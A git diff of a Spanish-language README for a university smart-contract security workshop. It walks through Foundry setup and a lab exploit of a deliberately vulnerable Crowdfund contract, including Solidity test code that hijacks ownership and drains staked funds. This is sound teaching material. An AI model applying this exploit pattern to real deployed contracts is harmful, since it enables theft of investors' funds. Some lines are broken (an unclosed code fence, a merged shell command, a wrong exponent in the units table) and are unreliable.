@@ -1,6 +1,6 @@
 # Taller Práctico de Seguridad en Smart Contracts - HackersWeek X
 
-¡Bienvenidos al taller práctico sobre seguridad en Smart Contracts, organizado por el grupo de investigación [NICS Lab](https://www.nics.uma.es/) de la Universidad de Málaga, con motivo de celebración de la HackersWeek X organizada por el Consejo de Estudiantes!
+¡Bienvenidos a este laboratorio práctico sobre seguridad en Smart Contracts, desarrollado por el grupo de investigación [NICS Lab](https://www.nics.uma.es/) de la Universidad de Málaga dentro del programa [Cybercamp UMA](https://www.nics.uma.es/cybercamp-uma/). El día 5 de Marzo lo pusimos a prueba en un taller dentro de la [HackersWeek X](https://hackersweek.es/) organizada por el [Consejo de Estudiantes de Informática](https://www.uma.es/etsi-informatica/info/126304/consejo-de-estudiantes/) con una buena acogida por parte de los asistentes!
 
 ## Descripción del Taller
 
@@ -40,7 +40,11 @@ Vamos a necesitar un entorno de desarrollo integrado, podemos utilizar cualquier
 
 ### Foundry
 
-Lo siguiente que necesitamos es instalar un framework de desarrollo para Solidity.
+Lo siguiente que necesitamos es instalar un framework de desarrollo para Solidity. 
+
+> [!NOTE]
+> Si vas a usar [Remix](https://remix.ethereum.org/), un IDE online para Solidity, puedes pasar al [siguiente paso](#contenido-del-repositorio).
+
 
 Foundry está compuesto por cuatro componentes:
 - [**Forge**](https://github.com/foundry-rs/foundry/blob/master/crates/forge): Ethereum Testing Framework
@@ -55,29 +59,35 @@ Foundry está compuesto por cuatro componentes:
 >- Cuenta con muchísimos cheatcodes para testing y debugging
 
 
-La forma recomendada de instalarlo es mediante la herramienta **foundryup**.
+La forma recomendada de instalarlo es mediante la herramienta **foundryup**. A continuación vamos a realizar la instalación paso a paso, pero si quieres realizar una instalación libre de dependencias, puedes seguir las instrucciones de instalación de [este repositorio](https://github.com/hardenerdev/smart-contract-auditor).
 
+#### Instalación
 
 > [!NOTE]
 > Si usas Windows, necesitarás instalar y usar [Git BASH](https://gitforwindows.org/) o [WSL](https://learn.microsoft.com/en-us/windows/wsl/install) como terminal, ya que Foundryup no soporta Powershell o Cmd.
-> 
 
 
 En la terminal ejecuta:
 
-`curl -L https://foundry.paradigm.xyz | bash`
+```shell
+curl -L https://foundry.paradigm.xyz | bash
+```
 
 Como resultado obtendrás algo parecido a esto:
 
-`Detected your preferred shell is bashrc and added Foundry to Path run:source /home/user/.bashrcStart a new terminal session to use Foundry`
+```consoleDetected your preferred shell is bashrc and added Foundry to Path run:source /home/user/.bashrcStart a new terminal session to use Foundry`
 
 Ahora simplemente escribe `foundryup` en la terminal y pulsa `Enter`. Esto instalará los cuatro componentes de Foundry: *forge*, *cast*, *anvil* y *chisel*.
 
 Para confimar la correcta instalación escribe `forge --version`. Deberías de obtener la versión instalada de forge:
-`Forge version x.x.x`
+```shell
+Forge version x.x.x
+```
 
 Si no has obtenido la versión, es posible que necesites añadir Foundry a tu PATH. Para ello, puedes ejecutar lo siguiente:
-`cd ~echo 'source /home/user/.bashrc' >> ~/.bash_profile`
+```shell
+cd ~echo 'source /home/user/.bashrc' >> ~/.bash_profile
+```
 
 Si aún así sigues teniendo problemas con la instalación, puedes seguir las instrucciones de instalación de Foundry en su [repositorio](https://book.getfoundry.sh/getting-started/installation).
 
@@ -87,7 +97,7 @@ Aún así, si no puedes instalar Foundry, no te preocupes, puedes seguir el tall
 
 Lo primero que vamos a hacer es clonar el repositorio del taller. Para ello, abre una terminal y ejecuta:
 
-```
+```shell
 # Clonamos el repo:
 https://github.com/nicslabdev/HackerWeekX-Web3-workshop.git
 
@@ -122,7 +132,7 @@ El siguiente diagrama nos ayudará a comprender el contrato inteligente, destaca
 - **STAKE_TARGET**: Target de inversión para el crowdfunding (1000 finney == 1 ether).
 - **MAX_ADMISSIBLE_STAKE_INCREASE**: Máximo incremento de inversión permitido (100 finney == 0.1 ether).
 - **MIN_ADMISSIBLE_STAKE_INCREASE**: Mínimo incremento de inversión permitido (2 finney == 0.002 ether).
-- **stakes**: Mapeo de las inversiones de cada inversor. (Si `stakes[msg.sender] == 1` implica que msg.sender es el owner)
+- **stakes**: Mapeo de las inversiones de cada inversor. (Si ```solidity stakes[msg.sender] == 1``` implica que msg.sender es el owner)
 - **maxStake**: Máxima inversión actual. (Si `maxStake == 0` implica que el crowdfunding está cerrado)
 - **leadInvestor**: Dirección del inversor mayoritario.
 
@@ -176,11 +186,14 @@ Ahora podemos analizar el comportamiento del contrato en su totalidad, vayamos p
 
 ### Tests
 
+> [!NOTE]
+> Si estás usando Remix, esta parte no es para ti. Sin embargo, puede ser interesante que le eches un vistazo para entender cómo se realizan los tests en Foundry.
+
 En la carpeta `/test` encontramos el archivo `Crowdfund.t.sol` que contiene los test de `Crowdfund.sol`. Estos tests están escritos en Solidity, y se ejecutan con el comando `forge test`. 
 
 La estructura típica de los tests es la siguiente:
     
-``` 
+```solidity 
 // SPDX-License-Identifier: GPL-3.0
 pragma solidity x.x.x;
 
@@ -188,38 +201,36 @@ import {Test, console} from "@forge-std/Test.sol";
 import {Contract} from "../src/Contract.sol";
 
 contract Contract_Test is Test{
-    Contract public targetContract;
+  Contract public targetContract;
 
-    /************************************** Variables **************************************/
+  /************************************** Variables **************************************/
 
+  // ...
+
+  /************************************** Modifiers **************************************/
+
+  modifier doSomethingBefore() {
     // ...
-
-    /************************************** Modifiers **************************************/
-
-    modifier doSomethingBefore() {
-        // ...
-        _;
-    }
+    _;
+  }
 
 
-    /**************************************** Set Up ***************************************/
+  /**************************************** Set Up ***************************************/
 
-    function setUp() public {
-        // ...
-    }
+  function setUp() public {
+    // ...
+  }
 
-    /***************************************** Tests ****************************************/
+  /***************************************** Tests ****************************************/
 
-    function testSomeFunction() public {
-        // ...
-    }
+  function testSomeFunction() public {
+    // ...
+  }
 
-    function testAnotherFunction() doSomethingBefore() public {
-        // ...
-    }
-
-}
-    
+  function testAnotherFunction() doSomethingBefore() public {
+    // ...
+  }
+}    
 ```
 
 Como podemos observar, en Foundry los tests también están escritos en solidity, y siguen una estructura similar a la de un contrato inteligente. En ellos podemos definir las variables que vamos a utilizar, los modificadores que vamos a aplicar, y las funciones que vamos a testear.
@@ -263,30 +274,35 @@ Parece realmente fácil, ¿verdad? Bastaría con hacer stake con 1 finney, sin h
 
 Para ello vamos a añadir un nuevo test al final del archivo `Crowdfund.t.sol`: 
 
-![Screenshot_04](/resources/Screenshot_04.png)
+```solidity 
+// Test para comprobar que el owner puede ser cambiado
+function test_stake_ObtainingOwnership() public {
+  //...
+}
+```
 
 > [!NOTE]
 >Es importante que la función comience por `test`, para que sea detectada por el comando `forge test`. 
 
 Debemos de recordar que antes de cada test se ejecuta la función `setUp`, veamos qué hace... 
 
-``` 
-    // La función setUp() es ejecutada antes de cada test para establecer el escenario inicial
-    function setUp() public {
-        // Aumentamos el balance de cada usuario
-        // La unidad por defecto es el wei, por lo que 1 ether = 1000 finney = 1e18 wei 
-        // Como DECIMALS es 10**15, estamos asignando 300 finney a cada usuario
-        vm.deal(owner, 300 * DECIMALS);
-        vm.deal(user1, 300 * DECIMALS);
-        vm.deal(user2, 300 * DECIMALS);
-        vm.deal(user3, 300 * DECIMALS);
-        vm.deal(user4, 300 * DECIMALS);
-        vm.deal(user5, 300 * DECIMALS);
+```solidity 
+// La función setUp() es ejecutada antes de cada test para establecer el escenario inicial
+function setUp() public {
+  // Aumentamos el balance de cada usuario
+  // La unidad por defecto es el wei, por lo que 1 ether = 1000 finney = 1e18 wei 
+  // Como DECIMALS es 10**15, estamos asignando 300 finney a cada usuario
+  vm.deal(owner, 300 * DECIMALS);
+  vm.deal(user1, 300 * DECIMALS);
+  vm.deal(user2, 300 * DECIMALS);
+  vm.deal(user3, 300 * DECIMALS);
+  vm.deal(user4, 300 * DECIMALS);
+  vm.deal(user5, 300 * DECIMALS);
 
-        // El owner despliega el contrato
-        vm.prank(owner);
-        crowfundContract = new Crowdfund();
-    }
+  // El owner despliega el contrato
+  vm.prank(owner);
+  crowfundContract = new Crowdfund();
+}
 ```
 
 Como podemos observar, al principio recarga el balance de cada usuario con 300 finney, y después despliega el contrato desde la dirección del owner.
@@ -294,29 +310,29 @@ Como podemos observar, al principio recarga el balance de cada usuario con 300 f
 > [!TIP]
 > Unidades: 
 >
-> | Unit   | Denominations                             |         |
-> | ------ | ----------------------------------------- | ------- |
-> | Wei    | 1                                         |         |
-> | Kwei   | 1,000                                     | (10^3)  |
-> | Mwei   | 1,000,000                                 | (10^6)  |
-> | Gwei   | 1,000,000,000                             | (10^9)  |
-> | Szabo  | 1,000,000,000,000                         | (10^12) |
-> | Finney | 1,000,000,000,000,000                     | (10^15) |
-> | Ether  | 1,000,000,000,000,000,000                 | (10^18) |
-> | KEther | 1,000,000,000,000,000,000,000             | (10^24) |
-> | MEther | 1,000,000,000,000,000,000,000,000         | (10^24) |
-> | GEther | 1,000,000,000,000,000,000,000,000,000     | (10^27) |
-> | TEther | 1,000,000,000,000,000,000,000,000,000,000 | (10^30) |
+> | Unit   | Denominations                             |                 |
+> | :----: | :---------------------------------------: | :-------------: |
+> | Wei    | 1                                         | 10<sup>0</sup>  |
+> | Kwei   | 1,000                                     | 10<sup>3</sup>  |
+> | Mwei   | 1,000,000                                 | 10<sup>6</sup>  |
+> | Gwei   | 1,000,000,000                             | 10<sup>9</sup>  |
+> | Szabo  | 1,000,000,000,000                         | 10<sup>12</sup> |
+> | Finney | 1,000,000,000,000,000                     | 10<sup>15</sup> |
+> | Ether  | 1,000,000,000,000,000,000                 | 10<sup>18</sup> |
+> | KEther | 1,000,000,000,000,000,000,000             | 10<sup>21</sup> |
+> | MEther | 1,000,000,000,000,000,000,000,000         | 10<sup>24</sup> |
+> | GEther | 1,000,000,000,000,000,000,000,000,000     | 10<sup>27</sup> |
+> | TEther | 1,000,000,000,000,000,000,000,000,000,000 | 10<sup>20</sup> |
 
 Ahora que sabemos esto, podemos escribir el test. 
 
-``` 
-    // Test para comprobar que el owner puede ser cambiado
-    function test_stake_ObtainingOwnership() public {
-        vm.prank(user1);                                         // Esto indica que la siguiente llamada se hará como user1 (msg.sender = user1)
-        crowfundContract.stake{value: 1 * DECIMALS}();           // Llamamos a stake() con user1 y 1 Finney
-        assertEq(uint(crowfundContract.stakes(user1)), 1);       // Comprobamos que el owner ha cambiado
-    }
+```solidity 
+// Test para comprobar que el owner puede ser cambiado
+function test_stake_ObtainingOwnership() public {
+    vm.prank(user1);                                         // Esto indica que la siguiente llamada se hará como user1 (msg.sender = user1)
+    crowfundContract.stake{value: 1 * DECIMALS}();           // Llamamos a stake() con user1 y 1 Finney
+    assertEq(uint(crowfundContract.stakes(user1)), 1);       // Comprobamos que el owner ha cambiado
+}
 ```
 
 Para ejecutar el test escribimos lo siguiente en la terminal: `forge test --match-test test_stake_ObtainingOwner`
@@ -416,7 +432,38 @@ Está compuesto por:
 - **test_exploit()**: Test que lo orquesta. Esta es la función que ejecutaremos, por lo que vamos a analizarla:
 
 
-![Screenshot_12](/resources/Screenshot_12.png)
+```solidity
+function test_exploit() public {        
+  console.log("-------------------------------------------------------------------------------");
+  console.log(unicode"\n\tLet's simulate the stake of different crowdfunding participants\n");
+  console.log("-------------------------------------------------------------------------------");
+  
+  stake(user1, 49 * DECIMALS);
+  stake(user2, 47 * DECIMALS);
+  stake(user3, 50 * DECIMALS);
+  stake(user4, 78 * DECIMALS);
+  stake(user5, 83 * DECIMALS);
+  stake(user1, 88 * DECIMALS);
+  stake(user2, 87 * DECIMALS);
+  stake(user3, 89 * DECIMALS);
+  stake(user4, 90 * DECIMALS);
+  stake(user5, 82 * DECIMALS);
+  
+  console.log("-------------------------------------------------------------------------------\n"); 
+  console.log(unicode"| => Funds on stake (crowdfund's balance) : 👀 %s * FINNEY", crowdfundContract.getTotalStake()/(1 * DECIMALS));
+  console.log(unicode"| => Attacker's balance                   : 👀 %s * FINNEY\n", address(attacker1).balance/(1 * DECIMALS));
+  console.log("-------------------------------------------------------------------------------"); 
+
+  console.log(unicode"\n\t\t\t💥💥💥💥 EXPLOITING... 💥💥💥💥\n"); 
+
+  exploit();
+
+  console.log("-------------------------------------------------------------------------------\n"); 
+  console.log(unicode"| => Funds on stake (crowdfund's balance) : ☠  %s * FINNEY", crowdfundContract.getTotalStake()/(1 * DECIMALS));
+  console.log(unicode"| => Attacker's balance                   : 💯 %s * FINNEY\n", address(attacker1).balance/(1 * DECIMALS));
+  console.log("-------------------------------------------------------------------------------");             
+}
+```
 
 Observamos que, antes de hacer el *exploit*, se realizan stakes desde distintas cuentas. Simulando el uso del contrato por distintos usuarios. Esto es muy importante, ya que para cerrar el crowdfunding necesitamos alcanzar el `STAKE_TARGET`, y para ello necesitamos que distintos usuarios hagan stake.
 
@@ -424,7 +471,20 @@ Los `console.log` son simples mensajes que se muestran en la terminal al ejecuta
 
 Ahora echemos un vistazo al *exploit* que comentamos anteriormente:
 
-![Screenshot_13](/resources/Screenshot_13.png)
+```solidity
+function exploit() internal {
+  vm.startPrank(attacker1);
+
+  crowdfundContract.stake{value: 100 * DECIMALS}();
+  crowdfundContract.stake{value: 100 * DECIMALS}();
+  crowdfundContract.stake{value: 57 * DECIMALS}();
+
+  crowdfundContract.closeFund();
+  crowdfundContract.withdraw();
+
+  vm.stopPrank();
+}
+```
 
 Mediante el *cheatcode* de Foundry `vm.startPrank(attacker)`, indicamos que todas las transacciones que se realicen antes de la instrucción `vm.stopPrank()` se harán siendo `attacker` el `msg.sender`.
 
